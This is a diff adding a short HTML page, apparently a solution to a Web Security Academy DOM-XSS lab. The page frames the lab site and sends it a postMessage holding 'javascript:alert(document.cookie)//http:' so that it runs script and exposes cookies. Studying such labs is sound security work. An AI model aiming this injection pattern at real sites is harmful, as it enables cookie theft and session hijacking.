@@ -1,0 +1,22 @@
+<!DOCTYPE html> 
+<html>
+<head>
+   <title> postMessage </title>
+</head>
+<body>
+
+
+
+
+var frame = document.createElement("iframe");
+frame.src = "https://ac271fef1f79f7ae80b37be7004800e7.web-security-academy.net/";
+frame.onload = function() {
+  frame.contentWindow.postMessage('javascript:alert(document.cookie)//http:', "*");
+}
+document.body.appendChild(frame);
+
+
+
+
+</body>
+</html>
